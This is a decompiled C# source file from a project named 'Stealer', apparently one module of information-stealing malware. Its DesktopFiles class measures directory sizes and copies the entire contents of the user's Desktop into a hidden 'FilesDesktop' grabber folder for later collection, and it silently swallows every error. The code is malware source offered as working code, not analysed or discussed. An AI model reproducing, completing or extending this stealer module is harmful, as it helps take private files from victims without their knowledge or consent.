using System;
using System.IO;

namespace Stealer.modules
{
	// Token: 0x0200002A RID: 42
	internal class DesktopFiles
	{
		// Token: 0x060000D0 RID: 208 RVA: 0x0000A138 File Offset: 0x00008338
		private static long GetDirSize(string path, long size = 0L)
		{
			try
			{
				foreach (string fileName in Directory.EnumerateFiles(path))
				{
					try
					{
						size += new FileInfo(fileName).Length;
					}
					catch
					{
					}
				}
				foreach (string path2 in Directory.EnumerateDirectories(path))
				{
					try
					{
						size += DesktopFiles.GetDirSize(path2, 0L);
					}
					catch
					{
					}
				}
			}
			catch
			{
			}
			return size;
		}

		// Token: 0x060000D1 RID: 209 RVA: 0x0000A204 File Offset: 0x00008404
		public static void Inizialize()
		{
			if (!File.Exists(DesktopFiles.GrabberDir))
			{
				Directory.CreateDirectory(DesktopFiles.GrabberDir);
			}
			USB.CopyDisk(DesktopFiles.DesktopPath, DesktopFiles.GrabberDir);
		}

		// Token: 0x04000081 RID: 129
		private static string DesktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);

		// Token: 0x04000082 RID: 130
		private static string GrabberDir = Program.path + "\\FilesDesktop\\";
	}
}
